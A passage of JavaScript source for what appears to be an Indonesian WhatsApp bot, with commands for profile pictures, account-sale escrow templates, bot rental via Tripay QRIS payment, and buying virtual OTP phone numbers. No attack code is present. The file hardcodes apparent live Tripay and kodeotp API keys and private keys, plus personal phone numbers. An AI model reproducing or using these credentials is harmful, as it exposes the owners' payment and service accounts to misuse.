var medis = await Biiofc.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
if (args[0] == `full`) {
var { img } = await generateProfilePicture(medis)
await Biiofc.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(medis)
reply(`*Success Tuan Ku✅*`)
} else {
var memeg = await Biiofc.updateProfilePicture(botNumber, { url: medis })
fs.unlinkSync(medis)
reply(`*Success Tuan Ku✅*`)
}
}
break
case 'setppgroup': {
if (!isGroup) return reply(mess.only.group)
if (!isAdmins && !isOwner) return reply(mess.only.admin)
if (!isBotAdmins) return reply(mess.only.badmin)
if (!quoted) return reply(`*Where is the picture?*`)
if (!/image/.test(mime)) return reply(`\`\`\`Send/Reply Image With Caption\`\`\` *${prefix + command}*`)
if (/webp/.test(mime)) return reply(`\`\`\`Send/Reply Image With Caption\`\`\` *${prefix + command}*`)
var mediz = await Biiofc.downloadAndSaveMediaMessage(quoted, 'ppgc.jpeg')
if (args[0] == `full`) {
var { img } = await generateProfilePicture(mediz)
await Biiofc.query({
tag: 'iq',
attrs: {
to: m.chat,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(mediz)
reply(`*Success Tuan Ku✅*`)
} else {
var memeg = await Biiofc.updateProfilePicture(m.chat, { url: mediz })
fs.unlinkSync(mediz)
reply(`*Success Tuan Ku✅*`)
}
}
break
case 'deleteppgroup': case 'delppgc': case 'deleteppgc': case 'delppgroup': {
if (!isGroup) return reply(mess.only.group)
if (!isAdmins && !isOwner) return reply(mess.only.admin)
if (!isBotAdmins) return reply(mess.only.badmin)
    await Biiofc.removeProfilePicture(from)
    }
    break
case 'donasi':{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
let tekssss = `MAU DONASI BANG ?😁
SILAHKAN PILIH PAYMENT DI BAWAH
DANA : PM OWMER
GOPAY : PM OWNER
QRIS : KETIK .qris
ORKUT : KETIK .orkut
BRI : KETIK .bri
PULSA1 : 085609412146
PULSA2 : 088286517973
GRUP :
${grup}
YTB : 
${youtube}
`
Biiofc.sendMessage(from, { image: fs.readFileSync(`./testimoni/donasi.jpg`),
 caption: tekssss, 
footer: `${ownerStore} © 2022`},
{quoted: fkontak})
}
break
case 'apakah': 
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
 if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} saya ganteng`)
const apa = ['Iya', 'Tidak', 'Bisa Jadi', 'Betul']
const kah = apa[Math.floor(Math.random() * apa.length)]
Biiofc.sendMessage(from, { text: `Pertanyaan : Apakah ${q}\nJawaban : ${kah}` }, { quoted:m })
        break
        case 'bagaimanakah':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} saya cantik`)
const gimana = ['Gak Gimana2', 'Sulit Itu Bro', 'Maaf Bot Tidak Bisa Menjawab', 'Coba Deh Cari Di Gugel','astaghfirallah Beneran???','Pusing ah','Owhh Begitu:(','Yang Sabar Ya Bos:(','Gimana yeee']
const ya = gimana[Math.floor(Math.random() * gimana.length)]
Biiofc.sendMessage(from, { text: `Pertanyaan : ${q}\nJawaban : ${ya}` }, { quoted:m })
break
case "formatpost": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const text12 = `🥀FORMAT JASPOST BY ${namaCreator}🥀
(BUKAN AKUN MILIK ADMIN)
                   
JUAL AKUN :
SPEK :
HARGA:
MC :
NOMER : wa.me/


NOTE‼️: WAJIB MENGGUNAKAN JASA ADMIN ${namaCreator} AGAR TERHINDAR DARI PENIPUAN


🥀BEE SMART BUYER🥀`
reply(text12)
}
break
case "formatneed": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const text12 = `*FORMAT JASA NEED AKUN BY ${namaCreator}*
*( BUKAN AKUN ADMIN )*

NAMA PEMILIK : 
AKUN : 
LOGIN : 
HARGA : 
SPEK AKUN : 
MC : 
  
*#TIDAK MENERIMA KIRKON*

📝𝐍𝐎𝐓𝐄 : 
*WAJIB MENGGUNAKAN JASA ADMIN ${namaCreator} UNTUK MENGHINDARI PENIPUAN*

*PERINGATAN ⚠️*
*MOHON NAMA PEMILIK AKUNNYA HARUS DI ISI DENGAN BENAR AGAR SELLER GAMPANG DI CARI*`
reply(text12)
}
break
case "feerekber": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const text12 = `FEE BER² ${namaCreator}

•0 - 99K ≠ 5K
•99K - 150K ≠ 10K
•151K - 200K ≠ 15K
•201K - 324K ≠ 20K
•325K - 400K ≠ 25K
•401K - 500K ≠ 30K
•501K - 599K ≠ 35K
•600K - 699K ≠ 40K
•700K - 799K ≠ 45K
•800K - 1JT ≠ 50K
•1,1JT - 1,7JT ≠ 70K
•1,8JT - 2,5JT ≠ 100K
•BTBER ≠ 50K 
•TTBEB ≠ 50K`
reply(text12)
}
break
case "formatpencairan": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const text12 = `FORMAT PENCAIRAN ${namaCreator}

Pencarian : 
No pay    : 
Atas nama :

KESALAHAN PADA NOMOR PENCAIRAN BUKAN JADI TANGGUNG JAWAB KAMI TOLONG DI CEK DENGAN DETAIL DAN SEBENAR-BENARNYA AGAR TIDAK TERJADI KESALAHAN YANG TIDAK DI INGINKAN KESALAHAN PADA NOMOR PENCAIRAN KAMI TIDAK AKAN BERTANGGUNG JAWAB`
reply(text12)
}
break
case "allrec": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const text12 = `REKAM LAYAR!

> HAPUS SEMUA PESAN GMAIL
> KOSONGKAN SEMUA SAMPAH GMAIL
> HAPUS AKUN FB DARI PERANGKAT
> LOGOUT FF

*BY* ${namaCreator}`
reply(text12)
}
break
case "danamasuk": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const text12 = `DANA MASUK!

SILAHKAN SEND DATA SECARA PRIBADI KALO SUDAH DONE DAN DATA SUDAH DI AMANKAN SILAHKAN KETIK DONE KE GRUP BESERTA BUKTI SS LOGIN AKUN AGAR DANA BISA DI CAIRKAN KE PENJUAL UNTUK PENJUAL SILAHKAN KETIK .formatpencairan LALU ISI DENGAN BENAR AGAR KAMI TIDAK SALAH MENCAIRKAN DANA KESALAHAN DI TANGGUNG PENJUAL

X TRX BATAL FEE TETEP KEPOTONG X
BE SMART BUYER AND SELLER`
reply(text12)
}
break
case "donerekber": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const text12 = `ALL TRX DONE ✅
 

   BUUYER : ✅
   SELLEER : ✅


NOTE ⛔ : JIKA ADA KENDALA DI LAIN WAKTU ADMIN SUDAH TIDAK BERTANGGUNG JAWAB ❗❗


TERIMA KASIH SUDAH BERBELANJA DI ${namaCreator}`
reply(text12)
}
break
case "jadibot":{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
jadibot(Biiofc, sender)
}
break
case "listjadibot":{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
listjadibot(Biiofc, m)
}
break
case "stopjadibot":{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
stopjadibot(Biiofc, sender)
}
break
case 'testi1':{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
let tekssss = `𝗛𝗮𝗹𝗹𝗼 𝗸𝗮𝗸👋🏻
Gambar di atas adalah testimoni Dari *${namaStore}*

Untuk Nominal transaksi bisa cek di atas ya kak..

Yang pasti *${namaStore}* adalah store paling amanah dan terpercaya✨

(Testimoni ke 1)
`
Biiofc.sendMessage(from, { image: fs.readFileSync(`./testimoni/testimoni_1.jpg`),
 caption: tekssss, 
footer: `${ownerStore} © 2023`},
{quoted: fkontak})
}
break
case 'testi2':{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
let tekssss = `𝗛𝗮𝗹𝗹𝗼 𝗸𝗮𝗸👋🏻
Gambar di atas adalah testimoni Dari *${namaStore}*

Untuk Nominal transaksi bisa cek di atas ya kak..

Yang pasti *${namaStore}* adalah store paling amanah dan terpercaya✨

(Testimoni ke 2)
`
Biiofc.sendMessage(from, { image: fs.readFileSync(`./testimoni/testimoni_2.jpg`),
 caption: tekssss, 
footer: `${ownerStore} © 2023`},
{quoted: fkontak})
}
break
case 'testi3':{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
let tekssss = `𝗛𝗮𝗹𝗹𝗼 𝗸𝗮𝗸👋🏻
Gambar di atas adalah testimoni Dari *${namaStore}*

Untuk Nominal transaksi bisa cek di atas ya kak..

Yang pasti *${namaStore}* adalah store paling amanah dan terpercaya✨

(Testimoni ke 3)
`
Biiofc.sendMessage(from, { image: fs.readFileSync(`./testimoni/testimoni_3.jpg`),
 caption: tekssss, 
footer: `${ownerStore} © 2023`},
{quoted: fkontak})
}
break
case 'testi4':{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
let tekssss = `𝗛𝗮𝗹𝗹𝗼 𝗸𝗮𝗸👋🏻
Gambar di atas adalah testimoni Dari *${namaStore}*

Untuk Nominal transaksi bisa cek di atas ya kak..

Yang pasti *${namaStore}* adalah store paling amanah dan terpercaya✨

(Testimoni ke 4)
`
Biiofc.sendMessage(from, { image: fs.readFileSync(`./testimoni/testimoni_4.jpg`),
 caption: tekssss, 
footer: `${ownerStore} © 2023`},
{quoted: fkontak})
}
break
case 'testi5':{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
let tekssss = `𝗛𝗮𝗹𝗹𝗼 𝗸𝗮𝗸👋🏻
Gambar di atas adalah testimoni Dari *${namaStore}*

Untuk Nominal transaksi bisa cek di atas ya kak..

Yang pasti *${namaStore}* adalah store paling amanah dan terpercaya✨

(Testimoni ke 5)
`
Biiofc.sendMessage(from, { image: fs.readFileSync(`./testimoni/testimoni_5.jpg`),
 caption: tekssss, 
footer: `${ownerStore} © 2023`},
{quoted: fkontak})
}
break
case 'testi6':{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
let tekssss = `𝗛𝗮𝗹𝗹𝗼 𝗸𝗮𝗸👋🏻
Gambar di atas adalah testimoni Dari *${namaStore}*

Untuk Nominal transaksi bisa cek di atas ya kak..

Yang pasti *${namaStore}* adalah store paling amanah dan terpercaya✨

(Testimoni ke 6)
`
Biiofc.sendMessage(from, { image: fs.readFileSync(`./testimoni/testimoni_6.jpg`),
 caption: tekssss, 
footer: `${ownerStore} © 2023`},
{quoted: fkontak})
}
break
case 'block':{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
if (!q) return reply(`Ex : ${prefix+command} Nomor Yang Ingin Di Block\n\nContoh :\n${prefix+command} 628xxxx`)
let nomorNya = q
await Biiofc.updateBlockStatus(`${nomorNya}@s.whatsapp.net`, "block") // Block user
reply('Sukses Block Yatim Jebeh Tuan✅')
}
break
case 'unblock':{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
if (!q) return reply(`Ex : ${prefix+command} Nomor Yang Ingin Di Unblock\n\nContoh :\n${prefix+command} 628xxxx`)
let nomorNya = q
await Biiofc.updateBlockStatus(`${nomorNya}@s.whatsapp.net`, "unblock")
reply('Sukses Unblock Yatim Jebeh Krna Terpaksa Tuan✅')
}
break
 case 'buysewainbot':{                       
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
 if (!isUrl(q) && !q.includes('whatsapp.com')) return reply(`Link Invalid`)
if(!q) return reply('example : sewa https://chat.whatsapp.com/EvwRjBk5J3c5aETCiasuLF|3day')
if(fs.existsSync(`./freya/sewa/${sender}.json`)) return reply(`Selesaikan pembelian anda sebelumnya`)
               let idproduk = q.split("|")
if (idproduk == "1day") {
global.nama = sewa.rizalxdzzdev1.nama;
global.idproduk = sewa.rizalxdzzdev1.id;
global.harga = sewa.rizalxdzzdev1.harga;
}
if (idproduk == "3day") {
global.nama = sewa.rizalxdzzdev2.nama;
global.idproduk = sewa.rizalxdzzdev2.id;
global.harga = sewa.rizalxdzzdev2.harga;
}
if (idproduk == "5day") {
global.nama = sewa.rizalxdzzdev3.nama;
global.idproduk = sewa.rizalxdzzdev3.id;
global.harga = sewa.rizalxdzzdev3.harga;
}
if (idproduk == "7day") {
global.nama = sewa.rizalxdzzdev4.nama;
global.idproduk = sewa.rizalxdzzdev4.id;
global.harga = sewa.rizalxdzzdev4.harga;
}
if (idproduk == "10day") {
global.nama = sewa.rizalxdzzdev5.nama;
global.idproduk = sewa.rizalxdzzdev5.id;
global.harga = sewa.rizalxdzzdev5.harga;
}
if (idproduk == "14day") {
global.nama = sewa.rizalxdzzdev6.nama;
global.idproduk = sewa.rizalxdzzdev6.id;
global.harga = sewa.rizalxdzzdev6.harga;
}
if (idproduk == "21day") {
global.nama = sewa.rizalxdzzdev7.nama;
global.idproduk = sewa.rizalxdzzdev7.id;
global.harga = sewa.rizalxdzzdev7.harga;
}
if (idproduk == "30day") {
global.nama = sewa.rizalxdzzdev8.nama;
global.idproduk = sewa.rizalxdzzdev8.id;
global.harga = sewa.rizalxdzzdev8.harga;
}
if (idproduk == "permanen") {
global.nama = sewa.rizalxdzzdev9.nama;
global.idproduk = sewa.rizalxdzzdev9.id;
global.harga = sewa.rizalxdzzdev9.harga;
}
const axios = require('axios');
const crypto = require('crypto');
const apiKey = "DEV-WOLUoq8TyMk6o1WYbzCTzbWLkQIBBRJO1TMA9bTO"
const privateKey = "ZEQbg-flMbR-z2jde-wfFeP-NveoC"
const merchant_code = "T25306"
const merchant_ref = 'INV' + randomNomor(1,999999);
const amount = global.harga
const signature = crypto.createHmac('sha256', privateKey).update(merchant_code + merchant_ref + amount).digest('hex');

const data = {
  'method': 'QRIS2',
  'merchant_ref': merchant_ref,
  'amount': amount,
  'customer_name': 'DE4YOUBOTZZ',
  'customer_email': 'de4you@gmail.com',
  'order_items': [{
    'name': 'Bot whatsaap'+amount,
    'price': amount,
    'quantity': 1
  }],
  'return_url': `https://wa.me/62831511146722`,
  'signature': signature
}

axios.post('https://tripay.co.id/api/transaction/create', data, {
  headers: {
    'Authorization': 'Bearer ' + apiKey
  },
  validateStatus: function (status) {
    return status < 999;
  }
})
.then((res) => {	
	let messn = `*── 「 CHECK OUT 」 ──*

_Silahkan Scan Qris Ini Untuk Membayar:_
_》No Ref : ${res.data.data.reference}_
_》Harga : ${formatmoney(res.data.data.amount_received)}_
_》Fee : ${formatmoney(res.data.data.total_fee)}_
_》Total : ${formatmoney(res.data.data.amount)}_
_》Method : Qris Otomatis_
_》Status : ${res.data.data.status}_

Jika Anda Sudah Melakukan Pembayaran Silahkan ketik Konfirsewa no ref Bot Akan Secara Otomatis Masuk Group Tanpa Acc Owner!.`
Biiofc.sendMessage(sender, { caption: messn, image: { url: res.data.data.qr_url } })
let obj = { id: sender, ref: res.data.data.reference, status: res.data.data.status }
fs.writeFileSync(`./freya/sewa/${sender}.json`, JSON.stringify(obj))
    }) 
          
.catch((err) => {
reply(`proses membuat qris`)
}) 
break
}  
case 'konfirsewa':{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
	if (!text) return reply(`_Silahkan masukan No Ref_\n\n*_❗Contoh:.konfirsewa T16262662_*`)
   if(!fs.existsSync(`./freya/sewa/${from}.json`)) return reply('Kamu tidak melakukan pembelian')

const axios = require('axios');
const deppo = JSON.parse(fs.readFileSync(`./freya/sewa/${from}.json`))
const apiKey = "9gsUxfRqcUS6f1OTXR0ueqZOj33e9YioeBQ1OEhK"
const privateKey = "spgut-dLZIP-aWBt7-edckK-usRyg"
const merchant_code = "T0001"
var reference = `${checkRefSewa(sender, deppo) ? checkRefSewa(sender, deppo) : args[2]}`
axios.get('https://tripay.co.id/api/transaction/detail?reference=' + text, {
  headers: { 'Authorization': 'Bearer ' + apiKey },
  validateStatus: function (status) {
    return status < 999;
  }
})
.then((res) => {
  if (res.data.success == true) {
    if (res.data.data.status == 'UNPAID') {
let abc = `kamu belum melakukan pembayaran`
Biiofc.sendMessage(from, {text:abc}, Biiofc.user.name, msg)
    } else if (res.data.data.status == 'PAID') {
    	 let brhsl= `*── 「 PEMBAYARAN BERHASIL 」 ──*

_Silahkan Scan Qris Ini Untuk Membayar:_
_》No Ref : ${res.data.data.reference}_
_》Harga : ${formatmoney(res.data.data.amount_received)}_
_》Fee : ${formatmoney(res.data.data.total_fee)}_
_》Total : ${formatmoney(res.data.data.amount)}_
_》Method : Qris Otomatis_
_》Status : ${res.data.data.status}_

Bot Akan Masuk Group Otomatis, Mungkin Membutuhkan Waktu Silahkan Tunggu Sebentar, Terimakasih!.`

Biiofc.sendMessage(msg.chat, {text:brhsl}, Biiofc.user.name, m)
let result = args[1].split('https://chat.whatsapp.com/')[1]
Biiofc.groupAcceptInvite(result).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
      fs.unlinkSync(`./freya/sewa/${from}.json`)
    } else if (res.data.data.status == 'EXPIRED') {
      reply('pembayaran kadaluarsa ')
      fs.unlinkSync(`./freya/sewa/${from}.json`)
    }
  } else {
    reply(res.data.message)
  }
})
.catch((err) => {
  reply(err)
});
break
}            
case 'cancelsewa':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if(!fs.existsSync(`./freya/sewa/${from}.json`)) return reply('Kamu tidak melakukan pembelian')
fs.unlinkSync(`./freya/sewa/${from}.json`)
        reply('Sukses')
break
case "cancel-otp":{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
if (!q) return reply(`id yah mana?`)
var res = await fetchJson(`${global.domainotp}/cancle-orders/${apikeyotp}/${q}`)
if (res.success == false) return reply(res.data.messages)
await sleep(1000)
let ress = res.data.data
reply(`*── 「 CANCEL BERHASIL 」 ──*

_》 id: ${q}_
_》 status : sukses cancel_
`)
}
break
case 'saldo-kodeotp':{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
axios
.get(
`https://kodeotp.com/api?api_key=3d5700330e0661a5b75121ff858c4e60&action=balance`,)
.then((kode) => {
if (kode.success == false) return reply(kode.data.messages)
let res = kode.data.data
let teks =`*Sisa Saldo Anda Sekarang*
- Saldo: Rp${res.balance}`
reply(teks)
})
}
break
case 'daftar-layanan':{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!q) return reply(`id negara?`)
axios
.get(
`https://kodeotp.com/api?api_key=3d5700330e0661a5b75121ff858c4e60&action=get_service&country_id=${q}&type=reguler`,)
.then((kodee) => {
if (kodee.success == false) return reply(kodee.data.messages)
var teks = '*Cara Order Nokos, Silahkan Ketik:*\n.otp\n\n*Contoh:* .otp\n\n*List Layanan Operator*\n\n'
let GG = 0
for (let x of kodee.data.data){
teks +=`✨ ID layanan: ${x.service_id}\n✨ Name: ${x.service_name}\n✨ HARGA : RP${x.cost}\n✨ menghitung: ${x.count}\n\n`
}
reply(teks)
})
}
break
case  'ip':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
  if (args.length !== 1) {
    return reply('Format salah! Penggunaan: cekip link');
  }

  const link = args[0];

  dns.resolve4(link, (err, addresses) => {
    if (err) {
      return reply('Gagal melakukan DNS reverse lookup.');
    }

    if (addresses.length === 0) {
      return reply('Tidak ada alamat IP yang ditemukan.');
    }

    const ip = addresses[0];
    reply(`Alamat IP dari ${link} adalah: ${ip}`);
  });
  break
case 'layanan-negara':{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
axios
.get(
`https://kodeotp.com/api?api_key=3d5700330e0661a5b75121ff858c4e60&action=country`,)
.then((kodee) => {
if (kodee.success == false) return reply(kodee.data.messages)
var teks = '*Cara Order Nokos, Silahkan Ketik:*\n.kodeotp *\n\n'
let GG = 0
for (let x of kodee.data.data){
teks +=`✨ ID layanan: ${x.country_id}\n✨ Name: ${x.name}\n\n`
}
reply(teks)
})
}
break
case 'profile':{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
let kode = await fetchJson(`${global.domainotp}/get-profile/${apikeyotp}`)
if (kode.succes == false) return reply(kode.data.messages)
let res = kode.data.data
let teks =`*GET PROFILE*
》 Username: ${res.username}
》 Saldo: Rp${res.saldo}
》 Email: ${res.email}`
reply(teks)
}
break
case 'layanan-otp':{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ngapain ? Khusus De4you Offcial Aja !!`)
let kode = await fetchJson(`${global.domainotp}/get-services/${apikeyotp}`)
if (kode.succes == false) return reply2(kode.data.messages)
var teks = '*Cara Order Nokos, Silahkan Ketik:*\n.order id_layanan\n\n*Contoh:* .order 14\n\n*List Layanan Kode Otp*\n\n'
let GG = 0
for (let x of kode.data.data){
teks +=`- ID layanan: ${x.id}\n- Name: ${x.name}\n- Harga: Rp${toRupiah(x.price)}\n\n`
}
reply(teks)
}
break
case 'cancelsms':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if(!fs.existsSync(`./freya/nokos/${sender}.json`)) return reply('Kamu tidak melakukan pembelian')
fs.unlinkSync(`./freya/nokos/${sender}.json`)
        reply('Sukses')
        break        
case "ceksaldomaupedia" : {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
        if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
        let sha1 = require('sha1')
    let sign = sha1(api_id + api_key)
    let axios = require('axios')
        axios('https://maupedia.com/api/profile',{method: 'POST',data: new URLSearchParams(Object.entries({key: api_key,secret: secret,sign: sign}))}).then((res) => {
          if (res.data.result == false) {
            reply(`*_${res.data.message}_*`)
          }
          if (res.data.result == true) {
            anjay = `*── 「 Balance Mau pedia 」 ──*\n\n*_》 Name : ${res.data.data.full_name}_*\n*_》 Username : ${res.data.data.username}_*\n*_》 Balance : ${res.data.data.balance}_*\n*_》 Point : ${res.data.data.point}_*\n*_》 Level : ${res.data.data.level}_*\n*_》 Register : ${res.data.data.registered}_*`
            Biiofc.sendMessage(from, { text: anjay }, { quoted:m})
          }
      })
    }
break
case "topupgame" : {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
        if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
        let [id, zone, kode] = q.split(" ")
        let sha1 = require('sha1')
